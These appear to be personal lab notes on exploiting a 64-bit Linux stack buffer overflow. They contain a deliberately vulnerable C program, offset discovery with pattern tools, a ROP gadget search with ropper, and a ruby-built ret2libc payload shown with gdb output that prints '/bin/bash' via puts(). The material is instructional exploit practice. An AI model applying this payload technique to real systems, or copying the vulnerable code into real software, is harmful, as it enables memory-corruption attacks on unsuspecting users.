*************
to setup peda
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
fix gdb stack align(headache) issue
echo unset env LINES >> ~/.gdbinit
echo unset env COLUMNS >> ~/.gdbinit
*************
One big difference between 32 vs 64 bit BOF is in 64 bit, function arguments are passed through registry (standard calling convention for 64 bit).  
In addition, address are 64 bits but only up to 0x00007FFFFFFFFFFF is used, so anything above this will get violation

Linux syscall argument and syscall
x86 eax for the init 0x80 number
arguments go to ebx, ecx, edx, esi, edi, and ebp
x86_64 rax for the syscall number
arguments go to rdi, rsi, rdx, r10, r8, and r9

vulnerable program code
/* Disable ASLR: echo 0 > /proc/sys/kernel/randomize_va_space     */

#include <stdio.h>
#include <unistd.h>

int vuln() {
    char buf[80];
    int r;
    r = read(0, buf, 400);
    printf("\nRead %d bytes. buf is %s\n", r, buf);
    puts("No shell for you :(");
    return 0;
}

int main(int argc, char *argv[]) {
    printf("Try to exec /bin/sh");
    vuln();
    return 0;
}

#from the code and disassemble, red is overflowinhg buf[80] with 400 bytes, and overflow will be triggered when vuln exits.
#so first find the offset to rip
#dump this string into buff, and what ever value is in rip, we'll use that to find hte offset
root@kali:~/Desktop# ./pattern_create.rb -l 400
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A

(gdb) disassemble vuln 
Dump of assembler code for function vuln:
   0x0000000000400576 <+0>:	push   rbp
   0x0000000000400577 <+1>:	mov    rbp,rsp
   0x000000000040057a <+4>:	sub    rsp,0x60
   0x000000000040057e <+8>:	lea    rax,[rbp-0x60]
   0x0000000000400582 <+12>:	mov    edx,0x190
   0x0000000000400587 <+17>:	mov    rsi,rax
   0x000000000040058a <+20>:	mov    edi,0x0
   0x000000000040058f <+25>:	call   0x400450 <read@plt>
   0x0000000000400594 <+30>:	mov    DWORD PTR [rbp-0x4],eax
   0x0000000000400597 <+33>:	lea    rdx,[rbp-0x60]
   0x000000000040059b <+37>:	mov    eax,DWORD PTR [rbp-0x4]
   0x000000000040059e <+40>:	mov    esi,eax
   0x00000000004005a0 <+42>:	mov    edi,0x400674
   0x00000000004005a5 <+47>:	mov    eax,0x0
   0x00000000004005aa <+52>:	call   0x400440 <printf@plt>
   0x00000000004005af <+57>:	mov    edi,0x40068f
   0x00000000004005b4 <+62>:	call   0x400430 <puts@plt>
   0x00000000004005b9 <+67>:	mov    eax,0x0
=> 0x00000000004005be <+72>:	leave  
   0x00000000004005bf <+73>:	ret    
End of assembler dump.
(gdb) p $rbp
$2 = (void *) 0x7fffffffe220
(gdb) x/10x 0x7fffffffe220
0x7fffffffe220:	0x6441336441326441	0x4136644135644134
0x7fffffffe230:	0x3964413864413764	0x6541316541306541
0x7fffffffe240:	0x4134654133654132	0x3765413665413565
0x7fffffffe250:	0x6641396541386541	0x4132664131664130
0x7fffffffe260:	0x3566413466413366	0x6641376641366641

#so rip got 4136644135644134
#lets make this into a usable offset
root@kali:~/Desktop# ./pattern_offset.rb -l 400 -q 4136644135644134
[*] Exact match at offset 104

#this means ret addr is 104 into the buffer, and initial payload is (with CCC being ret)
ruby -e 'print "A"*104  "CCCCCCCC" > ./ret2libc.exploit

#since x86_64 function parameters are passed through register, ret addr must point to instructions that will put arguments into register. register for the first argument is edi, so a pop edi will do.

Ropper can help with that
install ropper
root@kali:~/Desktop# pip install ropper

looking for something with pop rdi in the program
root@kali:~/Desktop/myC/stackOverflow/64Bit# ropper --file ./ret2libc --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: ./ret2libc
0x0000000000400653: pop rdi; ret;

#cool now we have ret addr, and payload now looks like this
#ruby print "A"*104 + "\x00\x00\x00\x00\x00\x40\x06\x53".reverse 

with 
pop rdi
ret

the BOF can be setup so that ret points to pop rdi; ret
address following ret can be address to strting to print
And following that can be addres to put()

#find /bin/bash string
so just have gdb print all strings out 5000 bytes after rbp and we look for "/bin/bash"
(gdb) x/5000s $rbp

found it ^^ 0x7fffffffe66b:	"SHELL=/bin/bash"

so 0x7fffffffe66b + 6 = 0x7fffffffe671 = "/bin/bash"

#find address of puts()
(gdb) p puts
$6 = {<text variable, no debug info>} 0x7ffff7a9f700 <_IO_puts>

#now ths paylod is
ruby -e 'print "A"*104 + "\x00\x00\x00\x00\x00\x40\x06\x53".reverse + "\x00\x00\x7f\xff\xff\xff\xe6\x71".reverse + "\x00\x00\x7f\xff\xf7\xa9\xf7\x00".reverse' | ./ret2libc

run it in gdp
(gdb) run < ./ret2libc.exploit
Starting program: /root/Desktop/myC/stackOverflow/64Bit/ret2libc < ./ret2libc.exploit
Try to exec /bin/sh
Read 128 bytes. buf is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAï¿½
No shell for you :(

Breakpoint 3, 0x00000000004005be in vuln ()
(gdb) continue 
Continuing.

Breakpoint 4, 0x00000000004005bf in vuln ()
(gdb) continue 
Continuing.
/bin/bash
[Inferior 1 (process 3416) exited normally]

*** /bin/bash did got printed out ^^
